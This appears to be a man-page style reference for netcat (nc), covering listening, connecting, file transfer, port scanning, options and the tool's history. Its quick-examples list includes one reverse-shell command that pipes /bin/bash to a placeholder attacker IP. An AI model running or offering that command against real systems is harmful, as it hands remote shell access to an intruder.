# TAGLINE

Read and write arbitrary data across TCP and UDP connections — the network Swiss-army knife

# TLDR

**Listen** on a TCP port and print whatever is sent

```nc -l [8080]```

**Connect** to a host on a port

```nc [host] [port]```

**Send a file** over a connection (sender side)

```nc [host] [port] < [file.txt]```

**Receive a file** over a connection (listener side)

```nc -l [port] > [file.txt]```

**Scan a port range** without sending data

```nc -zv [host] [20-30]```

**Use UDP** instead of TCP

```nc -u [host] [port]```

**Set an idle and connect timeout** of 5 seconds

```nc -w [5] [host] [port]```

**Open a simple chat / serial bridge** on stdin/stdout

```nc -l [1234]```

**Make a quick reverse shell** (use only when authorized)

```nc -e [/bin/bash] [attacker_ip] [4444]```

# SYNOPSIS

**nc** [_options_] _host_ _port_

**nc** **-l** [_options_] [_host_] _port_

# PARAMETERS

**-l**
> Listen for an incoming connection rather than initiating one.

**-k**
> (OpenBSD/Ncat) Keep listening after a client disconnects; accept multiple connections.

**-u**
> Use UDP instead of the default TCP.

**-z**
> Zero-I/O mode — open the connection only to test if the port is open. Combine with **-v** for scanning.

**-v** / **-vv**
> Verbose; print connection and protocol diagnostics. Repeat for more detail.

**-n**
> Do not perform any DNS or service-name lookups.

**-w** _SECONDS_
> Connect/idle timeout. The connection is closed after _seconds_ with no data.

**-q** _SECONDS_
> After EOF on stdin, wait _seconds_ before closing the network socket (use -1 to wait forever).

**-p** _PORT_
> Bind the local end of the connection to _port_ (source port).

**-s** _ADDR_
> Bind the local end of the connection to _addr_ (source address).

**-e** _COMMAND_
> (traditional/ncat with --allow-exec) Execute _command_ after the connection is made, redirecting its I/O to the socket. Disabled in many distributions for security.

**-4** / **-6**
> Force IPv4 or IPv6.

**-U**
> Use Unix-domain sockets instead of TCP/UDP. The "port" argument is then a socket path.

**-X** _PROTOCOL_
> Connect through a proxy using PROTOCOL: 4 (SOCKS4), 5 (SOCKS5), or connect (HTTP CONNECT).

**-x** _ADDR_[_:port_]
> Address (and optional port) of the proxy server used with **-X**.

# DESCRIPTION

**nc** (netcat) reads and writes data across network connections using TCP or UDP. It is intended both as a reliable back-end tool that can be driven by other programs and scripts, and as a feature-rich network debugging and exploration tool.

Common uses include opening ad-hoc client/server sockets, transferring files, banner grabbing, port scanning (**-z**), proxying, listening on Unix-domain sockets (**-U**), and tunnelling through SOCKS or HTTP CONNECT proxies (**-X**, **-x**).

Several incompatible implementations are commonly installed under the name **nc**:

- **OpenBSD netcat** — the default on most Linux and macOS systems; widely scriptable, no `-e`.
- **GNU netcat** — older, simpler, supports `-e`.
- **Ncat** (Nmap project) — scriptable replacement with TLS, IPv6, proxies, and brokered relays.

Behaviour and supported flags vary between them; check `nc -h` to see which version is installed.

# CAVEATS

Flag set differs across implementations — scripts portable to one **nc** may break on another. The **-e** option (execute a program after connect) is disabled in OpenBSD netcat for security; many hardened distributions ship without it. Listening with **nc** offers no authentication or encryption — never expose a raw nc listener on an untrusted network.

# HISTORY

Original netcat was written by **"Hobbit"** and posted to `alt.security` in **1995–1996**. The OpenBSD project later rewrote it from scratch and that variant became the de-facto standard on BSD, macOS and most modern Linux distributions. **Ncat** was developed as part of the **Nmap** project to add modern features (TLS, IPv6, proxying, brokered relays).

# SEE ALSO

[ncat](/man/ncat)(1), [socat](/man/socat)(1), [telnet](/man/telnet)(1), [curl](/man/curl)(1), [ssh](/man/ssh)(1)

